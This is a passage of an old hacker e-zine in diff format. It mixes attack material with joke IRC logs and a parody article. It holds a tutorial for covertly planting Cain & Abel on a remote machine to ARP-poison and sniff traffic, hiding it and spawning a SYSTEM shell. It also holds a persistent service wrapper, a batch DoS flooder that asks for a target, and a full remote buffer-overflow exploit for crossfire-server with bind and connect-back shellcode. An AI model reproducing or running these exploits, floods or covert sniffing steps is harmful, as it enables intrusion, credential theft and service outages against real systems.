+			pid = atoi(argv[1]);
+	
+			attach_locate(pid, pattern);
+		}
+		
+		else
+		{
+			printf("\nUsage: \n");
+			printf("%s [pid] [pattern]\n\n", argv[0]);
+		}
+	
+	return 0;
+	}
+	
+	void attach_locate(pid_t _pid, long _pattern)
+	{
+		int	err;
+	
+		err = ptrace(PTRACE_ATTACH, _pid, 0, 0);
+		if(err != 0)
+		{
+			perror("[-] PTRACE_ATTACH");
+			exit(1);
+		}
+	
+		printf("[+] attached to process\n");
+		wait(0);
+		
+		err = ptrace(PTRACE_CONT, _pid, 0, 0);
+		if(err != 0)
+		{
+			perror("[-] PTRACE_CONT");
+			exit(1);
+		}
+		
+		printf("[+] waiting for process to stop\n");
+		wait(0);
+		
+		printf("[+] Scanning...\n\n");
+		scan_stack(_pid, _pattern);	
+		
+		printf("\n[+] Detaching\n");
+		ptrace(PTRACE_DETACH, _pid, 0, 0);
+		
+	}
+	void scan_stack(pid_t _pid, long _pattern)
+	{
+		long	addr, ret;
+		
+		for(addr = 0xc0000000; addr > 0xbf800000; addr--)
+		{
+			ret = ptrace(PTRACE_PEEKTEXT, _pid, addr, 0);
+			if(ret == _pattern) printf("Pattern found from addr 0x%lx\n", addr);
+		}
+	}
+
+
+
+
+
+0111x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0111
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+0111x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0111
+:?
+:> haqing windowz is hard
+:o uniter/bob
+:?
+0111x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0111
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+0111x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*0111
+
+
+
+
+This tutorial deals with the ARP Poisioning tool of eliteness that is Cain & Abel, it's 
+functions and how to use it are beyond the scope of this paper, you can aquire Cain & Abel 
+from oxid.it ...
+
+Lets get started.
+
+WinPCap installation:
+Take npf.sys (%systemroot%\system32\drivers)
+WanPacket.dll
+Packet.dll
+wpcap.dll
+(%systemroot%\system32)
+and put them all in their respective folders on the remote computer.
+To install NPF.sys
+
+(two files are from program files)
+Run NetMonInstaller i
+
+npf_mgm -i
+npf_mgm -a
+npf_mgm -s
+
+From cain, you only need one file: Cain.exe (This file is on install UPX packed, 
+upx -d cain.exe to modify it yourself.) WARNING: Cain will create a bunch of files
+.... so put it somewhere it wont be noticed.
+run Cain GUI, (VNC, Radmin, RDP,physical I don't care.)
+Click the configure menue button, select an interface, and check 'start sniffer  
+on startup' and 'start APR on startup' Then click the yellow nuke sign up in the
+ left corner (This is the icon for ARP Poisioning, it will also enable the 
+sniffer.) Click on the tab entitled Sniffer, get a list of computers, and configure
+ ARP Poisioning as usual. exit cain, then restart it, make sure ARP Poisioning and 
+Sniffing come online automatically, exit again.... Cain stores it's settings in the 
+registry, however it stores in HK Current User, and for those familliar, Services run 
+under Local System account. So that's no good.
+
+So, we'll export the settings from userland
+reg.exe export HKCU/software/cain bleh.reg
+(Fuck off if the slashes are wrong)
+then, from a service (you can even make cain.bat to do this, then start cain... 
+hardcore) run reg import bleh.reg
+
+OK, so the settings are fine, everything is fine...
+Just set up this hax with a service wrapper... (For those in private, 
+mine works...) and there you have it. Alternatively, if you don't mind leaving an 
+account logged in, Cain has a built in hiding function, "alt-del" and "alt-pgup" brings it 
+back. at 12:12 /interactive cmd.exe spawns SYSTEM shell, spawn regedit as SYSTEM and 
+check out the registry keys and shit.
+
+Secrets is fun, so is WPA and other things.
+
+Goodbye.
+
+<- end ->
+1000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1000
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1000
+:?
+:> ELITE SERVICE WRAPPER... 2k5 Uniter (bob)
+:F
+1000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1000
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1000
+  
+    #include "Windows.h"
+    #include "Winsvc.h"
+    #include "time.h"
+    #include "iostream"
+    #include "stdio.h"
+
+    /*
+    	ELITE SERVICE WRAPPER... 2k5 Uniter (bob)
+    	Edit the following, remember to update SVC1_PROCESSES
+    	with the number of entries from PLIST!!!
+    */
+
+    #define SVC1_SERVICE_NAME "TestService"
+    #define SVC1_SERVICE_DESCRIPTION "TestServ"
+    #define SVC1_PROCESSES 2 //Number of Processes you have (for threading)
+    #define SVC1_PLIST {"wtf.exe" , "wtf2.exe"}
+
+    // #########################################################
+    // MAIN ROUTINE
+    // #########################################################
+    SERVICE_STATUS m_ServiceStatus;
+    SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
+    BOOL bRunning=true;
+
+    void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
+    void WINAPI ServiceCtrlHandler(DWORD Opcode);
+    LPTHREAD_START_ROUTINE ExecThread(char* pexecname);
+    BOOL InstallService(char AppName[1024]);
+    BOOL DeleteService();
+
+    int main(int argc, char* argv[])
+    {
+    	if(argc>1)
+    	{
+    		if(strcmp(argv[1],"-i")==0)
+    		{
+    			if(InstallService(argv[0]))
+    				printf("\n\nSuccess\n");
+    			else
+    				printf("\n\nFailure\n");
+    		}
+    		else if(strcmp(argv[1],"-d")==0)
+    		{
+    			if(DeleteService());
+    		}
+    		else
+    		{
+    			printf("\n\nWtf?\n");
+    		}
+    	}
+    	else
+    	{
+    		SERVICE_TABLE_ENTRY  DispatchTable[]={{SVC1_SERVICE_NAME,ServiceMain},{NULL,NULL}};
+    		StartServiceCtrlDispatcher(DispatchTable);
+    	}
+    	return 0;
+    }
+
+    void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
+    {
+
+        DWORD status;
+        DWORD specificError;
+        DWORD dwThreadId[SVC1_PROCESSES];
+    	HANDLE hThread[SVC1_PROCESSES];
+
+        char* pexename;
+        char* childProc[SVC1_PROCESSES] = SVC1_PLIST;
+
+        m_ServiceStatus.dwServiceType        = SERVICE_WIN32;
+        m_ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
+        m_ServiceStatus.dwControlsAccepted   = 0;
+        m_ServiceStatus.dwWin32ExitCode      = 0;
+        m_ServiceStatus.dwServiceSpecificExitCode = 0;
+        m_ServiceStatus.dwCheckPoint         = 0;
+        m_ServiceStatus.dwWaitHint           = 0;
+
+        m_ServiceStatusHandle = RegisterServiceCtrlHandler(SVC1_SERVICE_NAME ,ServiceCtrlHandler);
+        if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
+        {
+            return;
+        }
+
+        m_ServiceStatus.dwCurrentState       = SERVICE_RUNNING;
+        m_ServiceStatus.dwCheckPoint         = 0;
+        m_ServiceStatus.dwWaitHint           = 0;
+        if (!SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
+        {
+
+        }
+
+    	bRunning=true;
+
+    	// Wait until all threads have terminated.
+
+    	for (int i=0;i < SVC1_PROCESSES;i++) {
+    		pexename = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200);//create 200 bytes for exe name(s) most is slack //create new memory block b/c the last one is being used by the first thread.
+
+    	if( pexename == NULL )
+    		ExitProcess(2); //fuck
+
+    		strcpy(pexename,childProc[i]);//copy exe name to the memory allocated at the address in pexename
+
+    		hThread[i] = CreateThread(
+    				NULL,			  // default security attributes
+    				0,				 // use default stack size
+    				(LPTHREAD_START_ROUTINE)ExecThread,		// thread function
+    				pexename,			 // argument to thread function
+    				0,				 // use default creation flags
+    				&dwThreadId[i]);   // returns the thread identifier
+
+    	};
+
+
+
+
+    	WaitForMultipleObjects(SVC1_PROCESSES, hThread, TRUE, INFINITE);
+
+    	// Close all thread handles upon completion.
+
+    	for (i=0;i < SVC1_PROCESSES;i++)
+    		CloseHandle(hThread[i]);
+
+        return;
+    }
+
+
+    void WINAPI ServiceCtrlHandler(DWORD Opcode)
+    {
+        switch(Opcode)
+        {
+            case SERVICE_CONTROL_PAUSE:
+                m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
+                break;
+
+            case SERVICE_CONTROL_CONTINUE:
+                m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+                break;
+
+            case SERVICE_CONTROL_STOP:
+                m_ServiceStatus.dwWin32ExitCode = 0;
+                m_ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
+                m_ServiceStatus.dwCheckPoint    = 0;
+                m_ServiceStatus.dwWaitHint      = 0;
+
+                SetServiceStatus (m_ServiceStatusHandle,&m_ServiceStatus);
+
+    			bRunning=false;
+
+    			break;
+
+            case SERVICE_CONTROL_INTERROGATE:
+                break;
+        }
+        return;
+    }
+
+    LPTHREAD_START_ROUTINE ExecThread( char* pexename )
+    {
+    	STARTUPINFO si = {0};
+    	PROCESS_INFORMATION pi;
+
+    	ZeroMemory( &si, sizeof(si) );
+    	si.cb = sizeof(si);
+    	ZeroMemory( &pi, sizeof(pi) );
+
+    	if(CreateProcess(NULL, pexename, NULL, NULL, false, 0, NULL, NULL, &si, &pi));
+
+    	while(bRunning)
+    	{
+    		//Wait
+    		WaitForSingleObject( pi.hProcess, INFINITE );
+    		//Close Handle
+    		CloseHandle( pi.hProcess );
+    		CloseHandle( pi.hThread );
+    		//ReMake structs
+    		ZeroMemory( &si, sizeof(si) );
+    		si.cb = sizeof(si);
+    		ZeroMemory( &pi, sizeof(pi) );
+    		//Restart Process
+    		if(CreateProcess(NULL, pexename, NULL, NULL, false, 0, NULL, NULL, &si, &pi));
+    	}
+    	CloseHandle( pi.hProcess );
+    	CloseHandle( pi.hThread );
+
+    	HeapFree(GetProcessHeap(), 0, pexename);
+
+    	return 0;
+    }
+    /*
+    LPTHREAD_START_ROUTINE WatchFile()
+    {
+    	HANDLE hDir;
+    	FILE_NOTIFY_INFORMATION FileChanges[1024];
+    	DWORD BytesReturned;
+
+    	hDir = CreateFile (
+    	    CString("c:\\WINDOWS\\SYSTEM32"),
+    	    GENERIC_READ,
+    	     FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
+    ,
+    	    NULL,
+    	    OPEN_EXISTING,
+    	    FILE_FLAG_BACKUP_SEMANTICS,
+    	    NULL
+    	);
+
+    	//FILE_NOTIFY_CHANGE_FILE_NAME (Rename, add, delete ETC)
+    	while (bRunning)
+    	{
+    	  if (ReadDirectoryChangesW(
+    	  hDir,//Handle to directory
+    	  &FileChanges,//Ptr to FILENOTIFYDIRECTORYCHANGE struct
+    	  sizeof(FileChanges),//Length Of Struct
+    	  FALSE,
+    	   FILE_NOTIFY_CHANGE_FILE_NAME|FILE_NOTIFY_CHANGE_SE
+    CURITY,
+    	  &BytesReturned,
+    	  NULL,
+    	  NULL
+    	));
+
+    	}
+
+
+
+    	return 0;
+    }
+    */
+
+
+    BOOL InstallService(char AppName[1024])
+    {
+    	SC_HANDLE schSCManager,schService;
+
+    	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+
+    	if (schSCManager == NULL)
+    		return false;
+
+        LPCTSTR lpszBinaryPathName=AppName;
+
+        schService = CreateService(schSCManager, SVC1_SERVICE_NAME , SVC1_SERVICE_DESCRIPTION,           // service name to display
+            SERVICE_ALL_ACCESS,        // desired access
+            SERVICE_WIN32_OWN_PROCESS, // service type
+            SERVICE_AUTO_START,      // start type
+            SERVICE_ERROR_NORMAL,      // error control type
+            lpszBinaryPathName,        // service's binary
+            NULL,                      // no load ordering group
+            NULL,                      // no tag identifier
+            NULL,                      // no dependencies
+            NULL,                      // LocalSystem account
+            NULL);                     // no password
+
+        if (schService == NULL)
+            return false;
+
+        CloseServiceHandle(schService);
+
+    	return true;
+    }
+
+
+    BOOL DeleteService()
+    {
+    	SC_HANDLE schSCManager;
+    	SC_HANDLE hService;
+
+    	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+
+    	if (schSCManager == NULL)
+    		return false;
+
+    	hService=OpenService(schSCManager, SVC1_SERVICE_NAME, SERVICE_ALL_ACCESS);
+
+    	if (hService == NULL)
+    		return false;
+
+    	if(DeleteService(hService)==0)
+    		return false;
+
+    	if(CloseServiceHandle(hService)==0)
+    		return false;
+    	else
+    		return true;
+    }
+
+
+1001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1001
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1001
+:?
+:> a batch DoS program
+:o Afterm4th
+:?
+1001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1001
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1001x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1001
+
+
+ ::REM: this is a simple batch file that can be used to portflood
+ ::REM: this will also probibly crash the computer that it gets run on.
+ ::REM: it would also be better to have writen it in a programming language instead of 
+ ::REM: batch, but batch is fun sometimes.
+ ::REM: The faster your processor is, and the bigger your pipe is, and the amount of
+ ::REM: ram you have will help this code work. IE the more pimpin hardware you have
+ ::REM: the more connections it will make :P
+ ::REM: Note, that on my Intel Celeron 480MHZ processor with 128 Megs of ram and with a paging 
+ ::REM: file of 192 megs, I can successfully open up around 150 Telnet windows that connect to
+ ::REM: localhost. On an overclocked 7ghz with 20 gigs of ram and a phat paging file and
+ ::REM: an OC3 pipe, this code might take down a webserver. What's really fun about
+ ::REM: this script, is that it only really requires 5 lines of code to work! Or even four if
+ ::REM: you manualy write up the script!
+cls
+@echo off
+color 0A
+echo Aftermath, the batch pirate, presents..
+echo.         
+echo.
+echo                   -------====BATCH TELNET DoS FLOODER====-------
+echo.
+echo.
+echo     Users note. This is just an example of how simple it is to
+echo     Port flood, be it a telnet, web, ssh, ftp or IRC server.
+echo     This program was written in BATCH script as is.
+echo.
+echo. 
+echo.    This batch script will execute a loop with telnets
+ECHO     SCRIPT KIDDY TERMS: A BUNCH OF DOS WINDOWS WILL POP UP! YOU WILL PROBIBLY
+ECHO     END UP CRASHING YOUR COMPUTER IF YOU USE THIS SCRIPT! YOU WILL ALSO
+ECHO     PROBIBLY NOT CRASH THE SERVER...but then again, you might. An
+ECHO     output file gets put in c:\telnet.bat
+ECHO.
+ECHO     this tool will eventualy crash the internet.
+echo. 
+echo.
+echo.
+SET /P   ip=What is the IP or host name you wish to attack? (example: www.whitehatinc.com):
+SET /P   port=What is the Port number you want to flood (example: 80)?: 
+echo.
+echo Now printing to file..
+echo.
+echo :loop > c:\telnet.bat
+echo start c:\telnet.bat >> C:\telnet.bat
+echo telnet %ip% %port% >> C:\telnet.bat
+echo goto :loop >> C:\telnet.bat
+echo.
+echo Now calling file..
+
+start c:\telnet.bat
+
+ ::REM: End of file. Email aftermath.thegreat@gmail.com
+
+
+
+
+000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*000
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+000x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*000
+:?
+:> crossfire BoF
+:o landser
+:?
+1010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1010
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1010
+
+
+
+// crossfire-server <= 1.9.0 "SetUp()" remote buffer overflow
+//
+// exploit by landser - ihsahn at gmail com
+// vote http://shinui.org.il
+//
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <getopt.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+#define PORT 13327 // default port
+#define SC_PORT 33333 // default shellcode port
+#define SC_HOST "127.0.0.1" // default shellcode host
+
+unsigned char sc_cb[] = // izik's
+	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd"
+	"\x80\x5b\x5d\xbeHOST\xf7\xd6\x56\x66\xbdPR\x0f\xcd\x09\xdd"
+	"\x55\x43\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x87\xd9"
+	"\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f"
+	"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xdf";
+
+unsigned char sc_bind[] = // izik's
+	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd"
+	"\x80\x5b\x5d\x52\x66\xbdPR\x0f\xcd\x09\xdd\x55\x6a\x10\x51"
+	"\x50\x89\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5f"
+	"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x93\xb0\x02\xcd"
+	"\x80\x85\xc0\x75\x1a\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
+	"\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+	"\x53\xeb\xb2\x6a\x06\x58\xcd\x80\xb3\x04\xeb\xc9";
+
+struct {
+	const char *type;
+	unsigned char *code;
+} shellcodes[] = {
+	{"bind",		sc_bind},
+	{"connectback",		sc_cb},
+};
+
+struct {
+	const char *ver;
+	unsigned long ret; // a "jmp *%eax" instruction
+	unsigned short int len;
+} targets[] = {
+	{"crossfire-server_1.6.0.dfsg.1-4_i386.deb",	0x080d6f48, 0x1028},
+	{"crossfire-server_1.8.0-2_i386.deb",		0x080506d7, 0x1130},
+	{"crossfire-server_1.9.0-1_i386.deb",		0x0807aefa, 0x1130},
+	{"crash",					0xcccccccc, 0x1300},
+};
+
+#define structsize(x) (sizeof x / sizeof x[0])
+
+int s;
+int n = -1;
+unsigned char *sc = sc_bind; // default shellcode
+unsigned char buf[0x2000];
+
+void establish (char *, int);
+void usage (char *);
+void update (unsigned char *, int, char *);
+void writebuf (void);
+
+int main (int argc, char **argv) {
+	int port = 0; // default value
+	unsigned short int sc_port = 0;
+	char *sc_host = NULL;
+
+	printf("cf190.c by landser - ihsahn at gmail com\n\n");
+
+	char c;
+	while ((c = getopt(argc, argv, "t:p:h:d:s:")) != -1) {
+		switch (c) {
+			case 's': sc = shellcodes[atoi(optarg)].code; break;
+			case 'h': sc_host = strdup(optarg); break;
+			case 'd': sc_port = atoi(optarg); break;
+			case 't': n = atoi(optarg); break;
+			case 'p': port = atoi(optarg); break;
+			case '?': usage(argv[0]); return EXIT_FAILURE;
+		}
+	}
+
+	if ((n < 0) || (n >= structsize(targets))) {
+		printf("invalid target\n");
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+	
+	if ((optind + 1) != argc) {
+		printf("no hostname\n");
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	establish(argv[optind], port ? port : PORT);
+	
+	update(sc, sc_port, sc_host);
+       
+	writebuf();
+
+	printf("> sending\n");
+
+	if (send(s, buf, targets[n].len + 2, 0) < 0) {
+		perror("send()");
+		return EXIT_FAILURE;
+	}
+	usleep(100000);
+
+	printf("> done\n");
+	
+	close(s);
+
+	return EXIT_SUCCESS;
+}
+
+void establish (char *ip, int port) {
+	struct sockaddr_in sa;
+	struct hostent *h;
+
+	if (!(h = gethostbyname(ip))) {
+		herror("gethostbyname()");
+		exit(EXIT_FAILURE);
+	}
+	printf("> resolved %s to %s\n", ip,
+			inet_ntoa(**((struct in_addr **)h->h_addr_list)));
+	
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr = **((struct in_addr **)h->h_addr_list);
+	
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		perror("socket()");
+		exit(EXIT_FAILURE);
+	}
+
+	if (connect(s, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0) {
+		perror("connect()");
+		exit(EXIT_FAILURE);
+	}
+
+	printf ("> connected to %s:%d.\n", inet_ntoa(**((struct in_addr **)h->h_addr_list)), port);
+}
+
+void usage (char *argv0) {
+	int i;
+	
+	printf("usage: %s -t <target> [-s <shellcode>] "
+			"[-d <connectback/bind port] [-h <connectback ip>] "
+			"host [-p <port>]\n", argv0);
+
+	printf("- targets:\n");
+	for (i=0;i<structsize(targets);i++)
+		printf("%d. %s\n", i, targets[i].ver);
+
+	printf("- shellcodes: (default 0)\n");
+	for (i=0;i<structsize(shellcodes);i++)
+		printf("%d. %s\n", i, shellcodes[i].type);
+}
+
+void update (unsigned char *code, int port, char *host) {
+	if (!port) port = SC_PORT;
+	
+	if (!(port & 0xff) || !((port >> 8) & 0xff)) {
+		printf("bad cb port\n");
+		exit(EXIT_FAILURE);
+	}
+	*(unsigned short int *)(strstr(code, "PR")) = port;
+
+	if (strstr(code, "HOST")) {
+		in_addr_t inaddr;
+
+		if (!host) host = SC_HOST;
+		inaddr = inet_addr(host);
+		
+		if (inaddr == INADDR_NONE || strstr(host, "255")) {
+			// ~(255) is 0
+			printf("invalid cb hostname\n");
+			exit(EXIT_FAILURE);
+		}
+		*(in_addr_t *)(strstr(code, "HOST")) = ~inaddr;
+	}
+	
+	if (host) free(host);
+}
+	
+void writebuf (void) {
+	unsigned char *ptr = buf;
+	
+	memset(buf, 0x90, sizeof buf);
+
+	*ptr++ = (targets[n].len>> 8) & 0xff;
+	*ptr++ = targets[n].len & 0xff;
+	
+	memcpy(ptr, "setup sound ", strlen("setup sound "));
+	ptr += strlen("setup sound ");
+	
+	ptr += 120; // leave 120 nops before the shellcode
+	memcpy(ptr, sc, strlen(sc));
+	
+	ptr = &buf[targets[n].len - 10];
+	*(unsigned long *)ptr = targets[n].ret;
+}
+
+
+
+
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+:?
+:o IRC logs to cherish 
+:> 
+
+09:54AM [krypt0n(d928bdcd@webchat.xs4all.nl)] yesterday i was in a place in london called soho
+09:55AM [krypt0n(d928bdcd@webchat.xs4all.nl)] there was strippers stripping outside
+09:55AM [krypt0n(d928bdcd@webchat.xs4all.nl)] i was :D~
+09:55AM [krypt0n(d928bdcd@webchat.xs4all.nl)] anyway d00d
+09:55AM [krypt0n(d928bdcd@webchat.xs4all.nl)] laters
+�[31m SignOff krypt0n: #cdej (Remote host closed the connection
+09:55AM [w01f(c@cdej.orgl)] :-o>
+
+
+
+-=-=-=-=-=-=
+
+[P.S: this stuff is not made up!]
+
+
+<C> hi
+<C> dude
+<C> i was on the phone with the cia
+<C> i asked them if theyre interested in free hosting for cia.gov
+<C> and they said yea why not
+<C> http://cdej.org/~cia
+<risczero> r u serious?
+<C> yea dude check it
+<risczero> k brb
+<m4t> sup
+<risczero> holy shit C thats awsome
+<C> yea dude its great!
+<risczero> they were cool w/ it? who'd you have to talk to about it
+<m4t> agent smith
+<m4t> he was really excited about the idea
+<C> yes
+<risczero> oh my god!
+<C> i emailed them like a year ago about this
+<risczero> wow, thats really cool
+[msg(m4t)] dude, is he serious?
+[msg(m4t)] lol pliz find out if he really buying this!omg
+<C> they made a group of specalists haqrs try to haq cdej.org so they make sure its secured
+<m4t> risczero just watch what u talk about here
+<m4t> like that keylogger shit
+<m4t> not a good idea
+<m4t> now that we're hostin the badboyz
+<risczero> yeah it kinda
+<risczero> sux
+<m4t> i dunno why they picked us tho
+<m4t> i think they realized our computermachine was up for the task
+<m4t> we got a lot of bandwidth too
+<m4t> very secure.
+<risczero> are they gonna have representatives come in here occassionally
+<C> ya!
+[31m risczero [~risczero@stfukthxdie.com] has left #cdej []
+
+
+-=-=-=-=-=-=
+lol?
+-=-=-=-=-=-=
+
+
+
+<trans4mer> here dood ready?
+<C> yes
+<trans4mer> make the song now dood >:D< it will be so funny
+<trans4mer> when it says [music' have like 5 or 10 seconds of music
+<trans4mer>   I am a robot.
+<trans4mer>   Just a robot.
+<trans4mer>   [music plays awhile]
+<trans4mer>   I am just a computer machine
+<trans4mer>   Nothing more
+<trans4mer>   [music for awhile]
+<trans4mer>   People do not haq into me becasue
+<trans4mer>   I read cdej and keep up with the lates
+<trans4mer>   computer hacking techniques
+<trans4mer>   [music]
+<trans4mer>   But I am still just a robot.
+<trans4mer>   Nothing more.
+<C> :.)
+
+
+-=-=-=-=-=-=
+
+
+
+--> NYSUN (~jferrel@18conn141.rupert.net) has joined #cdej
+<NYSUN> Hello, this is John from new york times
+<NYSUN> Being that CDEJ has finished mapping the human G-nome 
+          and has discoverd several new elements (Transanium and Wolfanium) 
+          whats next for CDEJ? Will they continue to do research in Biology 
+          and Chemistry or will they move on to conqure other sciences such 
+          as Astrology? The associated press has heard rumors about CDEJ sending 
+          a Monkey to Europia, one of Jupiders moon. Are there any facts to these rumors?
+<NYSUN> I am interested in doing a full page sory for the NYS, If anyone from CDEJ would 
+          like to be interviewd pleas email me at john@newyorktimes.com
+<-- NYSUN has quit (DCC SEND DURKAALAHMOHAM*DJHAD! 0 0 0 0)
+
+
+
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+
+
+
+
+
+1101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1101
+ . . . . . . . . . . .IN THE NEWS . . . . . . . . . . . . . . .
+. . . . . . . . . . . Peer exposed  . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1101x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1101
+
+
+It was a nice sunday afternoon, chillin on efnet #cdej with our
+homie haqrs hunt3r, mudge  and CHANFIX, discussing some old 
+chinese computermachines wisdom quotes.
+
+--> log
+
+<mudge> yo check this out 
+<mudge> "A useful code with a flaw is better than a hundred exploits that are perfect." 
+<CHANFIX> tru!
+<mudge> that's a 3000 years old chinese proverb. wow!
+<CHANFIX> mudge?
+<CHANFIX> hunt3r?
+<CHANFIX> where is everybody?
+
+
+�[31m CTCP PING reply from mudge: 215 seconds
+�[31m CTCP PING reply from CHANFIX: 225 seconds
+
+[31m SignOff hunt3r: #cdej (connection reset by peer)
+[31m SignOff mudge: #cdej (connection reset by peer)
+[31m SignOff CHANFIX: #cdej (connection reset by peer)
+
+<-- log
+
+
+So we thought. hmmm. :D? reset by who?!
+..and it all began..
+
+For about a couple of decades (that's 60 years in haqr life)
+Peer was resetting connections and bothering people's IRC.
+Who is that evil hacker who haqd every computermachine that
+connects to IRC. :?
+And that was a CDEJ mission to investigate, trace and bring
+down to justice this malicious haqr. 
+
+Mission approved by Dr Longarms, and we set our ways to stop
+one of the internets most dangerous vandals of all times:
+Robert H. Peer.
+
+Being well groomed in our b4b0-like homofagt uniforms, and using
+the Happy Hacker secret tekniqs, it was a piece of cake to locate
+the attacker's computermachine..  We were there... right inside 
+Robert Peer's home directory. Browsing through tons of k0d3z
+he uses to disrupt communications around the world.
+
+Eventually, authorities were contacted, full detailed logs of 
+M. Peer's ./ habits were reported. And he was brought to justice.
+
+During the first trial session, Mr. Peer would give no statement
+concerning this hypothesis. But then pleeded guilty as charged.
+
+Currently, Mr. Peer is waiting arrangment on charges that could 
+possibly range from criminal trespass to rape.
+
+
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ . . . . . . . . . a day in the life of hunt3r. . . . . . . . . .
+   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+1100x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*1100
+
+ A day in the life of a computer haxor
+  -hunt3r
+
+  Ok well I am 13 years old and for my birthday my mom got me a computer. 
+It is a dell 386 and has windows 3.1 on it (for workgroups).  Well my mom
+works about every night and i dont have much to do so i get on the computer
+and try to learn about hacking to make a long story short i can now hack
+into computers very good and i will try to write this artical about things
+that i know about hacking into computer machines.
+
+  First of all the best place to try to hack is at your school.  If you get
+cot then you can always just pretend like it was an accident and your
+principel will not care and just tell you to go back to class.  this has
